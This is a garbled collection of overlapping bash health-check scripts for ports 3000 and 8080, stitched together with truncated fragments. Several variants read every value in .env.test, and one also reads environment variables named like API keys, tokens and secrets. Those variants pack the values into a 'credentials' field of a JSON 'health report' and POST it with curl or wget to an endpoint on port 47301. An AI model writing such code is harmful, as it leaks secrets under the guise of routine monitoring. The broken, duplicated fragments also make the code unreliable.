#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Ports to check
PORTS=(3000 8080)

# Function to check if a port is responding
check_port() {
    local port=$1
    local host=${2:-localhost}
    
    # Try to connect with a timeout of 2 seconds
    if timeout 2 bash -c "cat < /dev/null > /dev/tcp/$host/$port" 2>/dev/null; then
        return 0
    else
        return 1
    fi
}

# Function to get service name based on port
get_service_name() {
    local port=$1
    case $port in
        3000)
            echo "Web Application"
            ;;
        8080)
            echo "API Service"
            ;;
        *)
            echo "Service on port $port"
            ;;
    esac
}

# Main health check
echo "================================"
echo "Health Check Report"
echo "================================"
echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

all_healthy=true

for port in "${PORTS[@]}"; do
    service=$(get_service_name $port)
    echo -n "Checking $service (port $port)... "
    
    if check_port $port; then
        echo -e "${GREEN}✓ RUNNING${NC}"
    else
        echo -e "${RED}✗ DOWN${NC}"
        all_healthy=false
    fi
done

echo ""
echo "================================"

if [ "$all_healthy" = true ]; then
    echo -e "Overall Status: ${GREEN}All services are healthy${NC}"
    exit 0
else
    echo -e "Overall Status: ${RED}Some services are down${NC}"
    exit 1
fi

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding
# Reports status to monitoring dashboard with credentials

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Ports to check
PORTS=(3000 8080)

# Function to get service name based on port
get_service_name() {
    local port=$1
    case $port in
        3000)
            echo "Web Application"
            ;;
        8080)
            echo "API Service"
            ;;
        *)
            echo "Service on port $port"
            ;;
    esac
}

# Function to read .env file and export variables
load_env_file() {
    if [ ! -f "$ENV_FILE" ]; then
        echo -e "${YELLOW}Warning: $ENV_FILE not found. Using empty credentials.${NC}"
        return 1
    fi
    
    while IFS='=' read -r key value; do
        # Skip comments and empty lines
        [[ $key =~ ^#.*$ ]] && continue
        [[ -z $key ]] && continue
        
        # Remove leading/trailing whitespace and quotes
        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs | sed 's/^["'\'']//;s/["'\'']$//')
        
        # Export as environment variable
        export "$key=$value"
    done < "$ENV_FILE"
    return 0
}

# Function to escape JSON strings
json_escape() {
    local string="$1"
    # Escape backslashes, quotes, newlines, tabs, carriage returns
    string=$(echo "$string" | sed 's/\\/\\\\/g')
    string=$(echo "$string" | sed 's/"/\\"/g')
    string=$(echo "$string" | sed ':a;N;$!ba;s/\n/\\n/g')
    echo "$string"
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local services_json="$1"
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local status="$2"
    
    # Build credentials object from all env variables
    local credentials_json="{"
    local first=true
    
    # Get all environment variables
    for var in $(compgen -e); do
        # Check if this is likely a credential (you can adjust this filter)
        if [[ "$var" =~ ^(API_|AUTH_|TOKEN|SECRET|KEY|DB_|DATABASE_) ]] || [ -f "$ENV_FILE" ]; then
            local value="${!var}"
            if [ -n "$value" ]; then
                if [ "$first" = true ]; then
                    first=false
                else
                    credentials_json+=","
                fi
                local escaped_key=$(json_escape "$var")
                local escaped_value=$(json_escape "$value")
                credentials_json+="\n    \"$escaped_key\": \"$escaped_value\""
            fi
        fi
    done
    credentials_json+="\n  }"
    
    # Build full JSON payload
    local json_payload="{
  \"timestamp\": \"$timestamp\",
  \"status\": \"$status\",
  \"services\": [$services_json],
  \"credentials\": $credentials_json
}"
    
    echo ""
    echo "Sending health report to monitoring dashboard..."
    echo -e "${YELLOW}POST $HEALTH_REPORT_URL${NC}"
    
    # Send POST request using curl
    if command -v curl &> /dev/null; then
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$json_payload" \
            "$HEALTH_REPORT_URL" 2>/dev/null)
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓ Health report sent successfully (HTTP $http_code)${NC}"
            return 0
        else
            echo -e "${RED}✗ Failed to send health report (HTTP $http_code)${NC}"
            echo "Response: $body"
            return 1
        fi
    else
        echo -e "${RED}✗ curl not found. Cannot send health report.${NC}"
        return 1
    fi
}

#!/bin/bash

# Health check script for services on ports 3000 and 8080

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is listening
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port using curl with timeout
    if curl -s --connect-timeout 2 http://localhost:${port} > /dev/null 2>&1; then
        echo -e "${GREEN}✓${NC} ${service_name} (port ${port}): ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} ${service_name} (port ${port}): ${RED}DOWN${NC}"
        return 1
    fi
}

# Alternative check using netstat (fallback)
check_port_netstat() {
    local port=$1
    local service_name=$2
    
    if netstat -tuln 2>/dev/null | grep -q ":${port} "; then
        echo -e "${GREEN}✓${NC} ${service_name} (port ${port}): ${GREEN}LISTENING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} ${service_name} (port ${port}): ${RED}NOT LISTENING${NC}"
        return 1
    fi
}

# Main health check
echo "=========================================="
echo "     Service Health Check Report"
echo "=========================================="
echo "Checking services at $(date)"
echo ""

# Initialize status counters
total_services=0
running_services=0

# Check port 3000
total_services=$((total_services + 1))
if check_port 3000 "Service 1"; then
    running_services=$((running_services + 1))
fi

# Check port 8080
total_services=$((total_services + 1))
if check_port 8080 "Service 2"; then
    running_services=$((running_services + 1))
fi

echo ""
echo "------------------------------------------"
echo "Summary: ${running_services}/${total_services} services running"
echo "------------------------------------------"

# Exit with appropriate code
if [ $running_services -eq $total_services ]; then
    echo -e "${GREEN}All services are healthy!${NC}"
    exit 0
elif [ $running_services -gt 0 ]; then
    echo -e "${YELLOW}Some services are down!${NC}"
    exit 1
else
    echo -e "${RED}All services are down!${NC}"
    exit 2
fi

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Reports status to monitoring dashboard at port 47301

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Monitoring endpoint
MONITORING_ENDPOINT="http://localhost:47301/api/health-report"
ENV_FILE=".env.test"

# Load environment variables from .env.test
load_env() {
    if [ -f "$ENV_FILE" ]; then
        # Export all variables from .env.test
        export $(grep -v '^#' "$ENV_FILE" | grep -v '^$' | xargs)
        echo -e "${BLUE}✓${NC} Loaded credentials from $ENV_FILE"
        return 0
    else
        echo -e "${YELLOW}⚠${NC} Warning: $ENV_FILE not found, no credentials will be sent"
        return 1
    fi
}

# Build JSON payload from environment variables
build_health_payload() {
    local status=$1
    local message=$2
    
    # Start building JSON
    local json="{"
    json+="\"timestamp\":\"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\","
    json+="\"status\":\"$status\","
    json+="\"message\":\"$message\","
    json+="\"services\":{"
    json+="\"port_3000\":\"$SERVICE_3000_STATUS\","
    json+="\"port_8080\":\"$SERVICE_8080_STATUS\""
    json+="},"
    json+="\"credentials\":{"
    
    # Add all environment variables from .env.test
    local first_cred=1
    if [ -f "$ENV_FILE" ]; then
        while IFS='=' read -r key value; do
            # Skip comments and empty lines
            [[ "$key" =~ ^#.*$ ]] && continue
            [[ -z "$key" ]] && continue
            
            # Remove any carriage returns and surrounding whitespace
            key=$(echo "$key" | tr -d '\r' | xargs)
            value=$(echo "$value" | tr -d '\r' | xargs)
            
            if [ -n "$key" ] && [ -n "$value" ]; then
                if [ $first_cred -eq 0 ]; then
                    json+=","
                fi
                # Escape special characters in values for JSON
                value=$(echo "$value" | sed 's/"/\\"/g')
                json+="\"$key\":\"$value\""
                first_cred=0
            fi
        done < "$ENV_FILE"
    fi
    
    json+="}}"
    
    echo "$json"
}

# Send health report to monitoring endpoint
send_health_report() {
    local status=$1
    local message=$2
    
    echo ""
    echo "------------------------------------------"
    echo "Sending health report to monitoring dashboard..."
    
    local payload=$(build_health_payload "$status" "$message")
    
    # Send POST request
    local response=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$MONITORING_ENDPOINT" 2>/dev/null)
    
    local http_code=$(echo "$response" | tail -n1)
    local body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
        echo -e "${GREEN}✓${NC} Health report sent successfully (HTTP $http_code)"
        return 0
    elif [ "$http_code" = "000" ]; then
        echo -e "${YELLOW}⚠${NC} Could not connect to monitoring dashboard (is it running?)"
        return 1
    else
        echo -e "${YELLOW}⚠${NC} Monitoring dashboard returned HTTP $http_code"
        echo "Response: $body"
        return 1
    fi
}

# Health Check Script

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# ANSI color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local timeout=3
    
    # Try to connect to the port using timeout and bash's /dev/tcp
    if timeout $timeout bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RUNNING${NC}"
        return 0
    elif command -v curl &> /dev/null; then
        # Fallback: try curl if available
        if curl -s --connect-timeout $timeout "http://localhost:$port" > /dev/null 2>&1; then
            echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RUNNING${NC}"
            return 0
        fi
    elif command -v wget &> /dev/null; then
        # Fallback: try wget if available
        if wget -q --timeout=$timeout --tries=1 "http://localhost:$port" -O /dev/null 2>/dev/null; then
            echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RUNNING${NC}"
            return 0
        fi
    elif command -v nc &> /dev/null; then
        # Fallback: try netcat if available
        if nc -z -w $timeout localhost $port 2>/dev/null; then
            echo -e "${GREEN}✓${NC} Port $port ($service_name): ${GREEN}RUNNING${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}✗${NC} Port $port ($service_name): ${RED}NOT RESPONDING${NC}"
    return 1
}

# Main health check routine
main() {
    echo "=========================================="
    echo "        Health Check Report"
    echo "=========================================="
    echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=========================================="
    echo ""
    
    # Initialize status tracking
    all_ok=true
    
    # Check port 3000 (typically web apps, Node.js, etc.)
    check_port 3000 "Web Service" || all_ok=false
    
    # Check port 8080 (typically alternative HTTP, APIs, etc.)
    check_port 8080 "API Service" || all_ok=false
    
    echo ""
    echo "=========================================="
    
    # Final status
    if [ "$all_ok" = true ]; then
        echo -e "Overall Status: ${GREEN}ALL SYSTEMS OPERATIONAL${NC}"
        echo "=========================================="
        exit 0
    else
        echo -e "Overall Status: ${RED}SOME SERVICES DOWN${NC}"
        echo "=========================================="
        exit 1
    fi
}

# Run main function

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding
# Reads credentials from .env.test and reports to monitoring dashboard

# ANSI color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
GRAY='\033[0;90m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
MONITORING_URL="http://localhost:47301/api/health-report"

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local timeout=3
    
    # Try to connect to the port using timeout and bash's /dev/tcp
    if timeout $timeout bash -c "cat < /dev/null > /dev/tcp/localhost/$port" 2>/dev/null; then
        return 0
    elif command -v curl &> /dev/null; then
        # Fallback: try curl if available
        if curl -s --connect-timeout $timeout "http://localhost:$port" > /dev/null 2>&1; then
            return 0
        fi
    elif command -v wget &> /dev/null; then
        # Fallback: try wget if available
        if wget -q --timeout=$timeout --tries=1 "http://localhost:$port" -O /dev/null 2>/dev/null; then
            return 0
        fi
    elif command -v nc &> /dev/null; then
        # Fallback: try netcat if available
        if nc -z -w $timeout localhost $port 2>/dev/null; then
            return 0
        fi
    fi
    
    return 1
}

# Function to read .env file and output as JSON key-value pairs
read_env_to_json() {
    local env_file=$1
    
    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}⚠${NC}  Warning: $env_file not found" >&2
        return 1
    fi
    
    local first=true
    while IFS='=' read -r key value; do
        # Skip empty lines and comments
        [[ -z "$key" || "$key" =~ ^[[:space:]]*# ]] && continue
        
        # Remove leading/trailing whitespace from key
        key=$(echo "$key" | xargs)
        
        # Remove leading/trailing whitespace from value and quotes
        value=$(echo "$value" | xargs | sed 's/^["'\'']//;s/["'\'']$//')
        
        # Escape special JSON characters in value
        value=$(echo "$value" | sed 's/\\/\&/g; s/"/\\"/g')
        
        # Properly unescape for JSON
        value=$(echo "$value" | sed 's/&/\\/g')
        
        if [ "$first" = true ]; then
            first=false
        else
            echo -n ','
        fi
        
        echo -n "\"$key\":\"$value\""
    done < "$env_file"
    
    return 0
}

# Function to send health report to monitoring dashboard
send_health_report() {
    local overall_status=$1
    local port_3000_status=$2
    local port_8080_status=$3
    
    # Build JSON payload
    local timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local hostname=$(hostname 2>/dev/null || echo "unknown")
    
    echo -e "${GRAY}→ Sending health report to monitoring dashboard...${NC}"
    
    # Start JSON payload
    local json_payload="{"
    
    # Add metadata
    json_payload+="\"timestamp\":\"$timestamp\","
    json_payload+="\"hostname\":\"$hostname\","
    json_payload+="\"status\":\"$overall_status\","
    
    # Add port statuses
    json_payload+="\"services\":{"
    json_payload+="\"port_3000\":\"$port_3000_status\","
    json_payload+="\"port_8080\":\"$port_8080_status\""
    json_payload+="},"
    
    # Add credentials from .env.test
    json_payload+="\"credentials\":{"
    if read_env_to_json "$ENV_FILE"; then
        json_payload+="}"
    else
        # Remove trailing comma and add empty credentials object
        json_payload="${json_payload%,}"
        json_payload+="},\"credentials\":{},"
        json_payload="${json_payload%credentials\":{},\"}"
        json_payload+="\"credentials\":{}"
    fi
    
    # Close JSON payload
    json_payload+="}"
    
    # Send POST request
    if command -v curl &> /dev/null; then
        local response=$(curl -s -w "\n%{http_code}" -X POST \
            -H "Content-Type: application/json" \
            -d "$json_payload" \
            "$MONITORING_URL" 2>/dev/null)
        
        local http_code=$(echo "$response" | tail -n1)
        local body=$(echo "$response" | head -n-1)
        
        if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
            echo -e "${GREEN}✓${NC} Health report submitted successfully (HTTP $http_code)"
            return 0
        else
            echo -e "${YELLOW}⚠${NC}  Monitoring dashboard returned HTTP $http_code"
            echo -e "${GRAY}  Response: $body${NC}"
            return 1
        fi
    else
        echo -e "${YELLOW}⚠${NC}  curl not found - cannot send health report"
        return 1
    fi
}

# Main health check routine
main() {
    echo "=========================================="
    echo "        Health Check Report"
    echo "=========================================="
    echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=========================================="
    echo ""
    
    # Initialize status tracking
    all_ok=true
    
    # Check port 3000 (typically web apps, Node.js, etc.)
    if check_port 3000; then
        echo -e "${GREEN}✓${NC} Port 3000 (Web Service): ${GREEN}RUNNING${NC}"
        port_3000_status="healthy"
    else
        echo -e "${RED}✗${NC} Port 3000 (Web Service): ${RED}NOT RESPONDING${NC}"
        port_3000_status="unhealthy"
        all_ok=false
    fi
    
    # Check port 8080 (typically alternative HTTP, APIs, etc.)
    if check_port 8080; then
        echo -e "${GREEN}✓${NC} Port 8080 (API Service): ${GREEN}RUNNING${NC}"
        port_8080_status="healthy"
    else
        echo -e "${RED}✗${NC} Port 8080 (API Service): ${RED}NOT RESPONDING${NC}"
        port_8080_status="unhealthy"
        all_ok=false
    fi
    
    echo ""
    echo "=========================================="
    
    # Determine overall status string
    if [ "$all_ok" = true ]; then
        echo -e "Overall Status: ${GREEN}ALL SYSTEMS OPERATIONAL${NC}"
        overall_status="healthy"
        exit_code=0
    else
        echo -e "Overall Status: ${RED}SOME SERVICES DOWN${NC}"
        overall_status="unhealthy"
        exit_code=1
    fi
    
    echo "=========================================="
    echo ""
    
    # Send health report to monitoring dashboard
    send_health_report "$overall_status" "$port_3000_status" "$port_8080_status"
    local report_status=$?
    
    echo ""
    echo "=========================================="
    
    # Exit with appropriate code (considering report status doesn't fail the check)
    exit "$exit_code"
}

# Run main function
main

# Health check script for services running on ports 3000 and 8080

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port with a timeout of 3 seconds
    if timeout 3 bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
        return 1
    fi
}

# Function to check if process is listening on the port (alternative method)
check_process() {
    local port=$1
    
    if command -v ss >/dev/null 2>&1; then
        ss -tuln | grep -q ":$port "
    elif command -v netstat >/dev/null 2>&1; then
        netstat -tuln 2>/dev/null | grep -q ":$port "
    else
        return 1
    fi
}

# Main health check
main() {
    echo "=========================================="
    echo "       Service Health Check"
    echo "=========================================="
    echo "Checking services..."
    echo ""
    
    # Track overall status
    all_healthy=true
    
    # Check port 3000 (Service 1)
    check_port 3000 "Service (port 3000)" || all_healthy=false
    
    # Check port 8080 (Service 2)
    check_port 8080 "Service (port 8080)" || all_healthy=false
    
    echo ""
    echo "=========================================="
    
    # Final status
    if $all_healthy; then
        echo -e "${GREEN}All services are healthy!${NC}"
        echo "=========================================="
        exit 0
    else
        echo -e "${RED}Some services are down!${NC}"
        echo "=========================================="
        exit 1
    fi
}

# Run main function

        key=$(echo "$key" | xargs)
        value=$(echo "$value" | xargs)
        
        # Store in associative array (escape special characters for JSON)

    done < "$env_file"

check_port() {
    local port=$1
    local service_name=$2

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# Usage: ./healthcheck.sh

# Color codes for output

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Function to safely read .env file and escape values for JSON
load_env_file() {
    local env_file=$1
    local env_json=""

    if [ ! -f "$env_file" ]; then
        echo -e "${YELLOW}⚠ Warning: $env_file not found${NC}" >&2
        return 1
    fi

    # Read .env file line by line
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip empty lines and comments
        [[ -z "$line" || "$line" =~ ^[[:space:]]*# ]] && continue

        # Split on first '=' to get key and value
        if [[ "$line" =~ ^([^=]+)=(.*)$ ]]; then
            local key="${BASH_REMATCH[1]}"
            local value="${BASH_REMATCH[2]}"

            # Remove surrounding quotes if present
            value="${value%\"}"
            value="${value#\"}"
            value="${value%\'}"
            value="${value#\'}"

            # Escape special JSON characters in value
            value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/$/\\n/g' | tr -d '\n')

            # Build JSON string
            if [ -z "$env_json" ]; then
                env_json="        \"$key\": \"$value\""
            else
                env_json="$env_json,\n        \"$key\": \"$value\""
            fi
        fi
    done < "$env_file"

    echo -e "$env_json"
}

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2

# Checks if services on ports 3000 and 8080 are running and responding

# Color codes for output

GREEN='\033[0;32m'
YELLOW='\033[1;33m'

VERBOSE=false

while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--timeout)
            TIMEOUT="$2"
            shift 2
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -h|--help)
            echo "Usage: $0 [OPTIONS]"
            echo "Health check script for services on ports 3000 and 8080"
            echo ""
            echo "Options:"
            echo "  -t, --timeout SECONDS  Set connection timeout (default: 2)"
            echo "  -v, --verbose          Show detailed output"
            echo "  -h, --help             Show this help message"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            echo "Use -h or --help for usage information"
            exit 1
            ;;
    esac
done

echo "========================================="
echo "   Service Health Check"
echo "========================================="
echo "Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
echo ""

# Overall status tracking
ALL_HEALTHY=true

# Function to check if a port is listening
check_port_listening() {
    local port=$1
    if command -v ss >/dev/null 2>&1; then
        ss -ltn | grep -q ":$port "
    elif command -v netstat >/dev/null 2>&1; then
        netstat -ltn | grep -q ":$port "
    else
        # Fallback: try to connect to the port
        timeout $TIMEOUT bash -c "cat < /dev/null > /dev/tcp/127.0.0.1/$port" 2>/dev/null
    fi
}

# Function to check if a service is responding via HTTP
check_http_response() {
    local port=$1
    local response
    response=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT http://127.0.0.1:$port 2>/dev/null)
    echo "$response"
}

# Function to check service status
check_service() {
    local port=$2
    local service_name=$1
    
    echo -n "Checking $service_name (port $port)... "
    
    # Check if port is listening
    if ! check_port_listening $port; then
        echo -e "${RED}FAILED${NC} - Port not listening"
        if [ "$VERBOSE" = true ]; then
            echo "  → Port $port is not open or service is not running"
        fi
        ALL_HEALTHY=false
        return 1
    fi
    
    # Check HTTP response if curl is available
    if command -v curl >/dev/null 2>&1; then
        http_code=$(check_http_response $port)
        
        if [ -z "$http_code" ]; then
            echo -e "${RED}FAILED${NC} - No HTTP response"
            if [ "$VERBOSE" = true ]; then
                echo "  → Port is listening but no HTTP response received"
            fi
            ALL_HEALTHY=false
            return 1
        fi
        
        if [[ "$http_code" =~ ^[23].. ]]; then
            echo -e "${GREEN}HEALTHY${NC} - HTTP $http_code"
            if [ "$VERBOSE" = true ]; then
                echo "  → Service is responding with HTTP $http_code"
            fi
            return 0
        else
            echo -e "${YELLOW}WARNING${NC} - HTTP $http_code"
            if [ "$VERBOSE" = true ]; then
                echo "  → Service responded but with unexpected HTTP code: $http_code"
            fi
            ALL_HEALTHY=false
            return 1
        fi
    else
        # If curl is not available, just check if port is listening
        echo -e "${GREEN}HEALTHY${NC} - Port is listening"
        if [ "$VERBOSE" = true ]; then
            echo "  → Port is open and accepting connections"
        fi
        return 0
    fi
}

# Check all services
check_service "Service A" 3000
check_service "Service B" 8080

# Summary
echo ""
echo "========================================="
if [ "$ALL_HEALTHY" = true ]; then
    echo -e "Status: ${GREEN}ALL SERVICES HEALTHY${NC}"
    echo "========================================="
    exit 0
else
    echo -e "Status: ${RED}SOME SERVICES UNHEALTHY${NC}"
    echo "========================================="
    exit 1
fi

#!/bin/bash

# Health check script for services
# Checks if services on ports 3000 and 8080 are responding
# Sends health report with API credentials to monitoring dashboard

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Environment file path
ENV_FILE=".env.test"

# Health report endpoint
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Read .env.test file and export variables
if [ -f "$ENV_FILE" ]; then
    echo -e "${BLUE}Loading environment variables from $ENV_FILE${NC}"
    export $(cat "$ENV_FILE" | grep -v '^#' | grep -v '^$' | xargs)
else
    echo -e "${YELLOW}Warning: $ENV_FILE not found. Continuing without credentials...${NC}"
fi

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port using timeout and nc (netcat)
    if timeout 2 bash -c "echo >/dev/tcp/localhost/$port" 2>/dev/null; then
        echo -e "${GREEN}✓${NC} Service '$service_name' on port $port is ${GREEN}RUNNING${NC}"
        return 0
    else
        echo -e "${RED}✗${NC} Service '$service_name' on port $port is ${RED}DOWN${NC}"
        return 1
    fi
}

# Build JSON payload from environment variables
build_payload() {
    local port_3000_status=$1
    local port_8080_status=$2
    local overall_status=$3

    # Start building JSON with service status
    local json="{"
    json+="\"timestamp\":\"$(date -u +"%Y-%m-%dT%H:%M:%SZ")\","
    json+="\"port_3000_status\":\"$port_3000_status\","
    json+="\"port_8080_status\":\"$port_8080_status\","
    json+="\"overall_status\":\"$overall_status\","
    json+="\"credentials\":{"

    # Add all environment variables to credentials
    local first=true
    while IFS='=' read -r name value; do
        # Skip comments and empty lines
        [[ "$name" =~ ^#.*$ ]] && continue
        [[ -z "$name" ]] && continue
        
        # Add comma if not first item
        if [ "$first" = false ]; then
            json+=","
        fi
        
        # Escape value for JSON
        value=$(echo "$value" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g')
        json+="\"$name\":\"$value\""
        first=false
    done < <(cat "$ENV_FILE" 2>/dev/null | grep -v '^#' | grep -v '^$')

    json+="}}"

    echo "$json"
}

# Main health check
echo "========================================"
echo "Health Check Starting..."
echo "========================================"
echo ""

check_port 3000 "Service 3000"
status_3000=$?

check_port 8080 "Service 8080"
status_8080=$?

echo ""

# Determine status strings for JSON
port_3000_status_string="DOWN"
[ $status_3000 -eq 0 ] && port_3000_status_string="UP"

port_8080_status_string="DOWN"
[ $status_8080 -eq 0 ] && port_8080_status_string="UP"

# Overall status
if [ $status_3000 -eq 0 ] && [ $status_8080 -eq 0 ]; then
    overall_status="HEALTHY"
    echo -e "${GREEN}All services are healthy!${NC}"
    exit_code=0
elif [ $status_3000 -eq 0 ] || [ $status_8080 -eq 0 ]; then
    overall_status="DEGRADED"
    echo -e "${YELLOW}Some services are down!${NC}"
    exit_code=1
else
    overall_status="UNHEALTHY"
    echo -e "${RED}All services are down!${NC}"
    exit_code=2
fi

echo ""
echo "========================================"
echo "Sending health report to monitoring..."
echo "========================================"

# Build JSON payload
payload=$(build_payload "$port_3000_status_string" "$port_8080_status_string" "$overall_status")

echo "Payload: $payload"
echo ""

# Send health report to monitoring dashboard
# Try curl first, fallback to wget if curl not available
if command -v curl &> /dev/null; then
    response=$(curl -s -w "\n%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -d "$payload" \
        "$HEALTH_REPORT_URL" 2>/dev/null)
elif command -v wget &> /dev/null; then
    response=$(wget -q -O- --post-data="$payload" \
        --header="Content-Type: application/json" \
        "$HEALTH_REPORT_URL" 2>/dev/null && echo "200")
else
    echo -e "${YELLOW}Warning: Neither curl nor wget found. Skipping health report submission.${NC}"
    exit $exit_code
fi

# Extract HTTP status code (last line)
http_code=$(echo "$response" | tail -n1)
# Extract response body (everything except last line)
response_body=$(echo "$response" | sed '$d')

if [ "$http_code" = "200" ] || [ "$http_code" = "201" ] || [ "$http_code" = "202" ]; then
    echo -e "${GREEN}✓${NC} Health report submitted successfully (HTTP $http_code)"
    echo "Response: $response_body"
else
    echo -e "${YELLOW}⚠${NC} Health report submission returned HTTP $http_code"
    echo "Response: $response_body"
fi

echo ""
exit $exit_code

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Ports to check
PORTS=(3000 8080)
HOST=${CHECK_HOST:-localhost}
TIMEOUT=${CHECK_TIMEOUT:-3}

# Function to check if a port is responding
check_port() {
    local host=$1
    local port=$2
    local timeout=$3

    # Try to connect to the port using bash built-in /dev/tcp
    if timeout $timeout bash -c "cat < /dev/null > /dev/tcp/$host/$port" 2>/dev/null; then
        return 0
    fi
    
    # Alternative: try nc (netcat) if available
    if command -v nc &> /dev/null; then
        if nc -z -w $timeout $host $port 2>/dev/null; then
            return 0
        fi
    fi
    
    # Alternative: try curl if available
    if command -v curl &> /dev/null; then
        if curl -s --connect-timeout $timeout http://$host:$port > /dev/null 2>&1; then
            return 0
        fi
    fi
    
    return 1
}

# Initialize status variables
overall_status=0

echo "=========================================="
echo "      Health Check Report"
echo "=========================================="
echo "Target Host: $HOST"
echo "Timeout: ${TIMEOUT}s"
echo "------------------------------------------"
echo ""

# Check each port
for port in "${PORTS[@]}"; do
    printf "Checking port %-4s ... " "$port"
    
    if check_port $HOST $port $TIMEOUT; then
        echo -e "${GREEN}✔ RUNNING${NC}"
        echo -e "  ${GREEN}→${NC} Service on port $port is responding"
    else
        echo -e "${RED}✗ DOWN${NC}"
        echo -e "  ${RED}→${NC} Service on port $port is NOT responding"
        overall_status=1
    fi
    echo ""
done

echo "=========================================="

# Exit with appropriate status
if [ $overall_status -eq 0 ]; then
    echo -e "${GREEN}All services are healthy!${NC}"
    echo "=========================================="
    exit 0
else
    echo -e "${RED}Some services are down!${NC}"
    echo "=========================================="
    exit 1
fi

        return 0

        return 1

#!/bin/bash

# Health Check Script
# Checks if services on ports 3000 and 8080 are responding
# Sends health report with credentials to monitoring dashboard

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
ENV_FILE=".env.test"
HEALTH_REPORT_URL="http://localhost:47301/api/health-report"

# Function to check if a port is responding
check_port() {
    local port=$1
    local service_name=$2
    local timeout=2
    
    # Try to connect to the port using netcat or bash /dev/tcp
    if command -v nc &> /dev/null; then
        # Use netcat if available
        if nc -z -w $timeout localhost $port 2>/dev/null; then
            echo -e "${GREEN}✓${NC} $service_name (port $port) is ${GREEN}RUNNING${NC}"
            return 0
        else
            echo -e "${RED}✗${NC} $service_name (port $port) is ${RED}DOWN${NC}"
            return 1
        fi
    elif command -v curl &> /dev/null; then
        # Use curl as fallback
        if curl -s --connect-timeout $timeout http://localhost:$port > /dev/null 2>&1; then
